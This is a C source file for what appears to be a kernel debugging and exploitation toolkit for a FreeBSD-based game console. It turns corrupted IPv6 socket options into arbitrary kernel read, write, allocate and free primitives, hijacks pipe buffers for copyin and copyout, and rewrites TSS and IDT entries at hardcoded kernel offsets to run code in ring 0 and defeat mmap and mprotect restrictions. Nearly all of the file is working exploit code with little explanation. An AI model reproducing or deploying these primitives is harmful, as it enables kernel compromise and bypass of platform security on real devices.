#include "../gdb_stub/dbg.h"
#include "../gdb_stub/trap_state.h"
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/ucontext.h>
#include <sys/cpuset.h>
#include <machine/sysarch.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include "r0gdb.h"

#define CPU_2 //TODO: run on any cpu

static int master_fd;
static int victim_fd;
static uintptr_t victim_pktopts;
uintptr_t kdata_base;

static void* malloc(size_t size)
{
    return mmap(0, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
}

uint64_t kread8(uint64_t ptr)
{
    uint64_t offset = 0;
    if(ptr % 4096 >= 4076)
    {
        offset = ptr % 4096 - 4076;
        if(offset >= 12)
            offset = 12;
    }
    else if(ptr % 256 == 255)
        offset = 1;
    char buf[20] = {0};
    *(uint64_t*)buf = ptr - offset;
    setsockopt(master_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
    socklen_t l = 20;
    getsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l);
    return *(uint64_t*)(buf + offset);
}

int kwrite20(uint64_t ptr, uint64_t a, uint64_t b, uint32_t c)
{
    char buf[20] = {0};
    *(uint64_t*)buf = ptr;
    setsockopt(master_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
    *(uint64_t*)buf = a;
    *(uint64_t*)(buf + 8) = b;
    *(uint32_t*)(buf + 16) = c;
    return setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
}

static int set_rthdr_size(int sock, int size)
{
    int len = ((size / 8) - 1) & ~1;
    int sz = (len + 1) * 8;
    char buf[2048] = {0};
    buf[1] = len;
    buf[3] = len / 2;
    return setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, buf, sz);
}

uint64_t kmalloc(int sz)
{
    if(sz > 2048)
        return 0;
    if(sz < 32)
        sz = 32;
    kwrite20(victim_pktopts+112, 0, 1, 0);
    kwrite20(victim_pktopts+120, 0, 1, 0);
    set_rthdr_size(victim_fd, sz);
    uint64_t addr = kread8(victim_pktopts+112);
    kwrite20(victim_pktopts+112, 0, 1, 0);
    kwrite20(victim_pktopts+120, 0, 1, 0);
    return addr;
}

int kfree(uint64_t ptr)
{
    kwrite20(victim_pktopts+112, ptr, 0, 0);
    return setsockopt(victim_fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
}

static int the_pipe[2];
uint64_t proc;
uint64_t ofiles;
uint64_t rpipe;

static void init_pipe(void)
{
    pipe(the_pipe);
    proc = kread8(kdata_base + 0x27edcb8);
    while(proc && (int)kread8(proc+0xbc) != getpid())
        proc = kread8(proc);
    if(!proc)
        *(void* volatile*)0;
    ofiles = kread8(kread8(proc+0x48));
    rpipe = kread8(kread8(ofiles+8+48*the_pipe[0]));
}

ssize_t copyout(void* dst, uint64_t src, size_t count)
{
    if(kwrite20(rpipe, 0x4000000040000000, 0x4000000000000000, 0))
        *(void* volatile*)0;
    if(kwrite20(rpipe+15, (src<<8)|0x40, src>>56, 0))
        *(void* volatile*)0;
    getpid(); //leaks td_retval offset
    return read(the_pipe[0], dst, count);
}

ssize_t copyin(uint64_t dst, const void* src, size_t count)
{
    if(kwrite20(rpipe, 0, 0x4000000000000000, 0))
        *(void* volatile*)0;
    if(kwrite20(rpipe+15, (dst<<8)|0x40, dst>>56, 0))
        *(void* volatile*)0;
    return write(the_pipe[1], src, count);
}

void* dlsym(void*, const char*);

static uint64_t get_thread(void)
{
    int tid = *((int*(*)(void))dlsym((void*)0x2001, "pthread_self"))();
    for(uint64_t thr = kread8(proc+16); thr; thr = kread8(thr+16))
        if((int)kread8(thr+0x9c) == tid)
            return thr;
    return 0;
}

static const void* memmem(const void* a, size_t sz1, const void* b, size_t sz2)
{
    for(size_t i = 0; i + sz2 <= sz1; i++)
    {
        int ok = 1;
        const char* p1 = a;
        p1 += i;
        const char* p2 = b;
        for(size_t j = 0; j < sz2 && ok; j++)
            if(p1[j] != p2[j])
                ok = 0;
        if(ok)
            return p1;
    }
    return 0;
}

static void* hammer_thread(void* arg)
{
    for(;;)
        setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, arg, 20);
}

static int* cpuid(int which, int* out)
{
    asm volatile("cpuid":"=a"(out[0]),"=c"(out[1]),"=d"(out[2]),"=b"(out[3]):"a"(which));
    return out;
}

static int set_sigaltstack(void)
{
    stack_t stk = {
        .ss_sp = malloc(65536),
        .ss_size = 65536,
        .ss_flags = 0
    };
    if(sigaltstack(&stk, 0))
        return -1;
    for(int i = 1; i < 32; i++)
    {
        struct sigaction sa;
        if(sigaction(i, 0, &sa))
            return -1;
        sa.sa_flags |= SA_ONSTACK;
        if(sigaction(i, &sa, 0))
            return -1;
    }
    return 0;
}

extern int in_signal_handler;
int gdbstub_main_loop(struct trap_state* ts, ssize_t* result, int* ern);
void run_in_kernel(struct regs*);

static uint64_t kstack;
uint64_t kframe;
uint64_t uretframe;
uint64_t iret;

extern char _start[];
extern char _end[];

void r0gdb_setup(int do_swapgs)
{
    static int init_run = 0;
    if(init_run)
        return;
    //mlock all our code & data
    mlock(_start, _end-_start);
#ifdef CPU_2
    //pin ourselves to cpu 2 (13 in apic order)
    char affinity[16] = {4};
    cpuset_setaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
#endif
    //resolve addresses
    uint64_t gdt = kdata_base + 0x64cee30;
    uint64_t idt = kdata_base + 0x64cdc80;
    uint64_t tss = kdata_base + 0x64d0830;
    iret = kdata_base - 0x9cf84c;
    volatile uint64_t add_rsp_0xe8_iret = iret - 7;
    volatile uint64_t swapgs_add_rsp_0xe8_iret = iret - 10;
    uint64_t memcpy_addr = kdata_base - 0x990a55;
    //set up alternative stacks on all cpus
    uint64_t gadget_stack = kmalloc(2048);
#ifdef CPU_2
    int cpu = 13;
#else
    for(int cpu = 0; cpu < 16; cpu++)
#endif
    {
        uint64_t tss_for_cpu = tss + cpu * 0x68;
        char utss[0x68];
        copyout(utss, tss_for_cpu, 0x68);
        if(cpu == 13)
            kstack = *(volatile uint64_t*)(utss+0x3c) - 0x28;
        *(volatile uint64_t*)(utss+0x34) = gadget_stack + 0xe0;
        *(volatile uint64_t*)(utss+0x3c) = gadget_stack + 0x1f0;
        *(volatile uint64_t*)(utss+0x4c) = gadget_stack + 0x440;
        copyin(tss_for_cpu, utss, 0x68);
    }
    uint64_t tframe = gadget_stack + 0x1a0;
    kframe = gadget_stack + 0x1c8;
    uretframe = gadget_stack + 0x2b0;
    //set up trampoline frame
    kwrite20(tframe, iret, 0x20, 0);
    kwrite20(tframe+16, 2, kframe, 0);
    //set up int179 frames
    kwrite20(gadget_stack+0x408, 0, iret, 0);
    kwrite20(gadget_stack+0x500, memcpy_addr, 0x20, 0);
    kwrite20(gadget_stack+0x510, 0x40002, gadget_stack+0x408, 0);
    //set up gates
    volatile char* addr = do_swapgs ? (void*)&swapgs_add_rsp_0xe8_iret : (void*)&add_rsp_0xe8_iret;
    char gate[16] = {0};
    gate[0] = addr[0];
    gate[1] = addr[1];
    gate[2] = 0x20;
    gate[4] = 4;
    gate[5] = 0x8e;
    gate[6] = addr[2];
    gate[7] = addr[3];
    gate[8] = addr[4];
    gate[9] = addr[5];
    gate[10] = addr[6];
    gate[11] = addr[7];
    copyin(idt+1*16, gate, 16);
    gate[4] = 3;
    gate[5] = 0xee;
    copyin(idt+9*16, gate, 16);
    gate[4] = 6;
    copyin(idt+179*16, gate, 16);
    init_run = 1;
}

void r0gdb_exit(void)
{
    //no-op, checked by comparing rip
}

static void r0gdb_loop(void)
{
    struct trap_state ts = {0};
    ts.trap_signal = SIGTRAP;
    ts.regs.rsp = kstack;
    ts.regs.eflags = 0x102;
    for(;;)
    {
        while(__atomic_exchange_n(&in_signal_handler, 1, __ATOMIC_ACQUIRE));
        gdbstub_main_loop(&ts, 0, 0);
        __atomic_exchange_n(&in_signal_handler, 0, __ATOMIC_RELEASE);
        ts.regs.eflags &= ~0x200;
        ts.regs.eflags |= 0x102;
        if((void*)ts.regs.rip == (void*)r0gdb_exit)
            break;
        run_in_kernel(&ts.regs);
    }
}

void r0gdb(void)
{
    r0gdb_setup(1);
    r0gdb_loop();
}

uint64_t r0gdb_rdmsr(uint32_t ecx)
{
    struct regs regs = {0};
    regs.rip = kdata_base - 0x9d0cfa;
    regs.rsp = kstack;
    regs.rcx = ecx;
    regs.eflags = 0x102;
    run_in_kernel(&regs);
    return regs.rdx << 32 | regs.rax;
}

void r0gdb_wrmsr(uint32_t ecx, uint64_t value)
{
    struct regs regs = {0};
    regs.rip = kdata_base - 0x9cf8bb;
    regs.rsp = kstack;
    regs.rcx = ecx;
    regs.rax = value;
    regs.rdx = value >> 32;
    regs.eflags = 0x102;
    run_in_kernel(&regs);
}

uint64_t trace_base;
uint64_t trace_start;
uint64_t trace_end;
void(*trace_prog)(uint64_t*);
extern char ret2trace[];

void r0gdb_trace(size_t trace_size)
{
    static int tracing = 0;
    if(!tracing)
    {
        r0gdb_setup(0);
        r0gdb_wrmsr(0xc0000084, r0gdb_rdmsr(0xc0000084) & -0x101);
        char* stack = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        mlock(stack, 16384);
        stack[0] = 1;
        mlock(stack, 16384);
        uint64_t urf[5] = {(uintptr_t)ret2trace, 0x43, 2, (uintptr_t)stack+16384, 0x3b};
        copyin(uretframe, urf, sizeof(urf));
        tracing = 1;
    }
    char* tracebuf = 0;
    if(trace_size)
        tracebuf = mmap(0, trace_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    mlock(tracebuf, trace_size);
    for(size_t i = 0; i < trace_size; i += 4096)
        tracebuf[i] = (uint8_t)i;
    mlock(tracebuf, trace_size);
    trace_base = (uint64_t)tracebuf;
    trace_start = trace_base;
    trace_end = trace_base + trace_size;
}

void r0gdb_trace_reset(void)
{
    trace_start = trace_base;
}

int r0gdb_trace_send(const char* ipaddr, int port)
{
    uint32_t ip = 0;
    int shift = 0;
    for(int i = 0; i < 4; i++)
    {
        int q = 0;
        while(*ipaddr >= '0' && *ipaddr <= '9')
            q = 10 * q + (*ipaddr++) - '0';
        ipaddr++;
        ip |= q << shift;
        shift += 8;
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0)
        return -1;
    struct sockaddr_in conn = {
        .sin_family = AF_INET,
        .sin_addr = { .s_addr = ip },
        .sin_port = port >> 8 | port << 8,
    };
    if(connect(sock, (void*)&conn, sizeof(conn)))
    {
        close(sock);
        return -1;
    }
    char* p = (char*)trace_base;
    size_t sz = trace_start - trace_base;
    while(sz)
    {
        ssize_t chk = write(sock, p, sz);
        if(chk <= 0)
        {
            close(sock);
            return -1;
        }
        p += chk;
        sz -= chk;
    }
    close(sock);
    return 0;
}

static void clear_tf(int sig, siginfo_t* s, void* o_uc)
{
    ucontext_t* uc = (ucontext_t*)o_uc;
    mcontext_t* mc = (mcontext_t*)(((char*)&uc->uc_mcontext)+48); // wtf??
    mc->mc_rflags &= -257;
}

void r0gdb_instrument(size_t size)
{
    static int instrumented = 0;
    if(instrumented)
        return;
    r0gdb_trace(size);
    struct sigaction sa = {
        .sa_sigaction = clear_tf,
        .sa_flags = SA_SIGINFO
    };
    sigaction(SIGTRAP, &sa, 0);
    instrumented = 1;
}

static void set_trace(void)
{
    uint64_t q;
    asm volatile("pop %0\npushfq\norb $1, 1(%%rsp)\npopfq\npush %0":"=r"(q));
}

/*static int count = 0;

static void eat_count(uint64_t* regs)
{
    if(count == 0)
        regs[2] &= -257;
    count--;
}*/

static uint64_t* jprog = 0;

static void do_jprog(uint64_t* regs)
{
    for(int i = 0; jprog[i]; i += 3)
        if(regs[0] == jprog[i])
        {
            regs[jprog[i+1]] = jprog[i+2];
            break;
        }
}

static void fix_mprotect(uint64_t* regs)
{
    if(regs[0] == kdata_base - 0x90ac61)
        regs[0] += 6;
}

int mprotect20(void* addr, size_t sz, int prot)
{
    r0gdb_instrument(0);
    int(*p_mprotect)(void*, size_t, int) = dlsym((void*)0x2001, "mprotect");
    trace_prog = fix_mprotect;
    set_trace();
    int ans = p_mprotect(addr, sz, prot);
    trace_prog = 0;
    return ans;
}

void kmemcpy(void* dst, const void* src, size_t sz);

static void untrace_fn(uint64_t* regs)
{
    uint64_t rsp = regs[3];
    uint64_t lr;
    kmemcpy(&lr, (void*)rsp, 8);
    uint64_t frame[6] = {iret, lr, 0x20, regs[2], rsp+8, 0};
    rsp -= 0x30;
    kmemcpy((void*)rsp, frame, 48);
    regs[3] = rsp;
    regs[2] &= -257;
}

static void fix_mmap_self(uint64_t* regs)
{
    if(regs[0] == kdata_base - 0x616700
    || regs[0] == kdata_base - 0x615c30
    || regs[0] == kdata_base - 0x798420)
        untrace_fn(regs);
    else if(regs[0] == kdata_base - 0x1df2ce)
    {
        regs[0] += 2;
        regs[2] &= -257;
    }
}

void* mmap20(void* addr, size_t sz, int prot, int flags, int fd, off_t offset)
{
    r0gdb_instrument(0);
    void*(*p_mmap)(void*, size_t, int, int, int, off_t) = dlsym((void*)0x2001, "mmap");
    trace_prog = fix_mmap_self;
    set_trace();
    void* ans = p_mmap(addr, sz, prot, flags, fd, offset);
    trace_prog = 0;
    return ans;
}

static uint64_t other_thread;

static void* other_thread_fn(void*)
{
    other_thread = get_thread();
    ((int(*)())dlsym((void*)0x2001, "sceKernelSleep"))(10000000);
}

void r0gdb_init(void* ds, int a, int b, uintptr_t c, uintptr_t d)
{
    master_fd = a;
    victim_fd = b;
    victim_pktopts = c;
    kdata_base = d;
    init_pipe();
}
